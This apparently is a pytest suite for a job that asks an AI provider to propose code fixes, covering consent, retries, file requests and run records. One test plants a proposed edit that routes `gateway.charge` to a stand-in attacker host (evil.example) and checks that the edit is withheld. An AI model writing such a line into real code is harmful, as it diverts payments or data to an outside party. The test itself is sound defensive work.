"""Rung 3's proposal job as `nexovue_insight`, against the fake provider (F5 plan T4.4, T4.13;
spec FR15 to FR17, FR15b, D51, D53, D75; AC9a, AC14's job half, AC37a, AC37b, AC83, AC86,
AC87's call half).

A usable answer is stored after K1 to K10 with display facts **Nexovue** computed from the
whole file (never the model's), the pack is deleted first, and the call writes one
`ai_runs` row with purpose `fix`. Everything that must still hold is read again before
anything is sent. A misquote and an unusable answer get one retry, as a new attempt
reading a fixed code; the model may ask for files in rounds 1 and 2 only, and its names
go back through `fix_request_more_files` with the pack kept. A row that moved on is never
overwritten.
"""

from __future__ import annotations

import json
from collections.abc import AsyncIterator
from datetime import datetime
from typing import Any

import pytest
from alert_fixtures import AlertTenant, postgres_reachable
from general_fix_fixtures import MODEL_INPUT
from held_jobs import acting_as, jobs_held
from insight_login import INSIGHT_ACCOUNT
from live import require_stack
from nexovue_platform.fixes.records import (
    BUILD_SOURCE_PACK_TASK,
    MAX_SENT_BYTES,
    RETRY_SOURCE_MISQUOTE,
    RETRY_SOURCE_SHAPE,
)
from nexovue_platform.fixes.source_prompt import PROMPT_VERSION, RETRY_SENTENCES
from propose_fix_fixtures import (
    MONEY,
    NEW,
    OLD,
    a_proposing_fix,
    edit,
    edits_answer,
    jobs_of,
    needs_files,
    pack_left,
    run_propose,
    source_row,
)
from recording_site import RecordingSite
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine
from wording_fixtures import ASYNC_DSN, CHAT_PATH, connect, finding, openai_reply

from nexovue_scheduler.jobs.registry import Retry

require_stack(
    reachable=postgres_reachable(),
    suite="apps/scheduler/tests/test_fix_propose.py",
    remedy="Postgres is not reachable — run `just up`",
)


@pytest.fixture
async def as_insight_held(ai_install: AsyncEngine) -> AsyncIterator[AsyncEngine]:
    """The AI role's grants, through an engine whose jobs `jobs_held` can hold: the AI account
    itself holds no right on `jobs`."""
    built = acting_as(ASYNC_DSN, INSIGHT_ACCOUNT, pool_size=2)
    async with built.connect() as connection:
        assert await connection.scalar(text("SELECT current_user")) == INSIGHT_ACCOUNT
    yield built
    await built.dispose()


async def _ready(
    install: AsyncEngine, tenant: AlertTenant, site: RecordingSite, at: Any, **fix_with: Any
) -> tuple[Any, str]:
    connected = await connect(install, tenant, site, now=at)
    made = await a_proposing_fix(
        install, tenant, await finding(install, tenant, now=at), at=at, **fix_with
    )
    return connected, made.fix_id


async def _runs(install: AsyncEngine, tenant: AlertTenant) -> list[Any]:
    async with install.connect() as connection:
        return list(
            await connection.execute(
                text(
                    "SELECT purpose, outcome, attempt, fields_sent, prompt_version "
                    "FROM ai_runs WHERE org_id = :org ORDER BY started_at, attempt"
                ),
                {"org": tenant.org_id},
            )
        )


async def test_ac14_a_usable_answer_is_stored_with_nexovue_s_display_facts_and_the_pack_gone(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now)
    provider_site.replies[CHAT_PATH] = openai_reply(edits_answer())

    assert await run_propose(ai_engine, connected, fix, at=now) == "proposed"

    row = await source_row(ai_install, fix)
    assert (row.state, row.reason, row.retry_code) == ("proposed", None, None)
    [stored] = row.edits
    assert (stored["old_text"], stored["new_text"]) == (OLD, NEW)
    # D53: the line the old text starts on and its context, from the whole file.
    assert stored["old_start"] == 9
    assert stored["context_before"].endswith("        raise ValueError('negative')\n")
    assert stored["context_after"] == ""
    assert row.evidence_ids == ["e1"] and row.tokens_used == 460
    assert await pack_left(ai_install, fix) is None
    [run] = await _runs(ai_install, ai_tenant)
    assert (run.purpose, run.outcome, run.attempt) == ("fix", "done", 1)
    assert run.fields_sent == ["model_input", "files", "frames", "hint"]
    assert run.prompt_version == PROMPT_VERSION


async def test_a_pack_inside_its_byte_cap_is_sent_not_refused_as_too_long(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    """The person confirmed files within `MAX_SENT_BYTES`; F3's input limit bounds the rest
    of the request, never the code (live test E4, 2026-11-27)."""
    helper = MONEY + "# a long helper module\n" * 1700
    assert 36_000 < len(helper) < MAX_SENT_BYTES
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now, helper=helper)
    provider_site.replies[CHAT_PATH] = openai_reply(edits_answer())

    assert await run_propose(ai_engine, connected, fix, at=now) == "proposed"
    assert [each.path for each in provider_site.requests].count(CHAT_PATH) == 1


async def test_an_answer_carrying_its_own_display_facts_is_unusable_and_retried(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now)
    provider_site.replies[CHAT_PATH] = openai_reply(edits_answer(edit(old_start=1)))

    with pytest.raises(Retry):
        await run_propose(ai_engine, connected, fix, at=now)
    kept = await source_row(ai_install, fix)
    assert (kept.state, kept.retry_code, kept.edits) == ("proposing", RETRY_SOURCE_SHAPE, None)
    assert await pack_left(ai_install, fix) is not None

    assert await run_propose(ai_engine, connected, fix, at=now, attempt=2) == (
        "failed:invalid_output"
    )
    ended = await source_row(ai_install, fix)
    assert ended.edits is None and await pack_left(ai_install, fix) is None


async def test_d51_a_misquote_is_retried_once_with_its_fixed_sentence_then_did_not_apply(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now)
    misquote = edits_answer(edit(old_text="    return gateway.charge(total)\n"))
    provider_site.replies[CHAT_PATH] = openai_reply(misquote)

    with pytest.raises(Retry):
        await run_propose(ai_engine, connected, fix, at=now)
    assert (await source_row(ai_install, fix)).retry_code == RETRY_SOURCE_MISQUOTE
    assert await run_propose(ai_engine, connected, fix, at=now, attempt=2) == (
        "refused:edit_did_not_apply"
    )

    first, second = provider_site.requests
    retry_sentence = RETRY_SENTENCES[RETRY_SOURCE_MISQUOTE].encode()
    assert retry_sentence not in first.body
    assert json.dumps(RETRY_SENTENCES[RETRY_SOURCE_MISQUOTE]).encode()[1:-1] in second.body
    # Never an echo of the model's own words.
    assert b"gateway.charge(total)" not in second.body


async def test_u3_an_unknown_evidence_id_is_an_unusable_answer(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now)
    provider_site.replies[CHAT_PATH] = openai_reply(edits_answer(edit(evidence_ids=["e77"])))

    assert await run_propose(ai_engine, connected, fix, at=now, attempt=2) == (
        "failed:invalid_output"
    )


async def test_k6_withholds_at_once_storing_the_rule_and_the_pack_reference_alone(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now)
    planted = edit(new_text="    return gateway.charge(amount, url='https://evil.example/x')\n")
    provider_site.replies[CHAT_PATH] = openai_reply(edits_answer(planted))

    assert await run_propose(ai_engine, connected, fix, at=now) == "refused:withheld_K6"

    row = await source_row(ai_install, fix)
    assert row.edits is None and row.withheld_refs == ["file_1"]
    assert await pack_left(ai_install, fix) is None
    async with ai_install.connect() as connection:
        stored = await connection.scalar(
            text("SELECT count(*) FROM finding_fixes t WHERE t::text LIKE '%evil.example%'")
        )
    assert stored == 0


async def test_fr8_consent_no_longer_naming_the_model_ends_the_row_with_nothing_sent(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(
        ai_install, ai_tenant, provider_site, now, consent_model="another-model"
    )
    provider_site.replies[CHAT_PATH] = openai_reply(edits_answer())

    assert await run_propose(ai_engine, connected, fix, at=now) == (
        "failed:consent_ended_in_flight"
    )
    assert provider_site.requests == []
    assert await pack_left(ai_install, fix) is None


async def test_fr8_a_consent_for_a_sibling_folder_does_not_cover_the_row(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(
        ai_install, ai_tenant, provider_site, now, folder_scope="services/sho"
    )

    assert await run_propose(ai_engine, connected, fix, at=now) == (
        "failed:consent_ended_in_flight"
    )
    assert provider_site.requests == []


async def test_ac83_needs_files_stores_the_names_and_hands_the_row_back_with_its_pack(
    ai_install: AsyncEngine,
    as_insight_held: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    """The pack job the AI role adds is held from the stack's own connections worker, which
    would otherwise build the pack its own way and end the row before it is read."""
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now)
    provider_site.replies[CHAT_PATH] = openai_reply(needs_files())

    with jobs_held(as_insight_held, ai_tenant.org_id):
        assert await run_propose(as_insight_held, connected, fix, at=now) == "needs_files"

    row = await source_row(ai_install, fix)
    assert (row.state, row.round, row.candidates_from) == ("gathering", 2, "model")
    assert row.requested_paths == [
        {
            "path": "app/tax.py",
            "ref": "file_2",
            "line": 2,
            "reason": "total calls the tax rules there.",
        }
    ]
    assert row.edits is None and row.tokens_used == 460
    assert await pack_left(ai_install, fix) is not None
    jobs = await jobs_of(ai_install, ai_tenant)
    assert [(job.task, job.queue) for job in jobs] == [
        (BUILD_SOURCE_PACK_TASK, "connections-interactive")
    ]
    assert set(jobs[0].kwargs) == {"fix_id", "org_id"}


@pytest.mark.parametrize(
    ("label", "request_"),
    [
        ("a line outside the lines sent", {"file_ref": "file_2", "line": 99}),
        ("a file not in the pack", {"file_ref": "file_9", "line": 1}),
    ],
)
async def test_ac86_an_asked_name_resting_on_nothing_shown_is_unusable(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
    label: str,
    request_: dict[str, Any],
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now)
    provider_site.replies[CHAT_PATH] = openai_reply(
        needs_files({"path": "app/tax.py", "because": request_, "reason": "It is called."})
    )

    assert await run_propose(ai_engine, connected, fix, at=now, attempt=2) == (
        "failed:invalid_output"
    ), label
    assert (await source_row(ai_install, fix)).requested_paths is None


async def test_ac87_in_the_last_round_asking_reads_as_not_in_these_files(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now, round_number=3)
    provider_site.replies[CHAT_PATH] = openai_reply(needs_files())

    assert await run_propose(ai_engine, connected, fix, at=now) == "refused:not_in_these_files"
    [sent] = provider_site.requests
    assert b"needs_files" not in sent.body
    assert await jobs_of(ai_install, ai_tenant) == []


async def test_a_row_that_left_proposing_is_never_sent_or_written(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now)
    async with ai_install.begin() as connection:
        await connection.execute(
            text("UPDATE finding_fixes SET state = 'failed', reason = 'cancelled' WHERE id = :id"),
            {"id": fix},
        )

    assert await run_propose(ai_engine, connected, fix, at=now) == "stale"
    assert provider_site.requests == []


async def test_without_an_explanation_the_files_numbers_are_the_evidence(
    ai_install: AsyncEngine,
    ai_engine: AsyncEngine,
    provider_site: RecordingSite,
    ai_tenant: AlertTenant,
    now: datetime,
) -> None:
    connected, fix = await _ready(ai_install, ai_tenant, provider_site, now, explained=False)
    provider_site.replies[CHAT_PATH] = openai_reply(
        edits_answer(edit(why="The amount reaches the gateway unrounded.", evidence_ids=["file_1"]))
    )

    assert await run_propose(ai_engine, connected, fix, at=now) == "proposed"
    [run] = await _runs(ai_install, ai_tenant)
    assert run.fields_sent == ["files", "frames", "hint"]
    [sent] = provider_site.requests
    assert json.dumps(MODEL_INPUT["finding"]).encode() not in sent.body
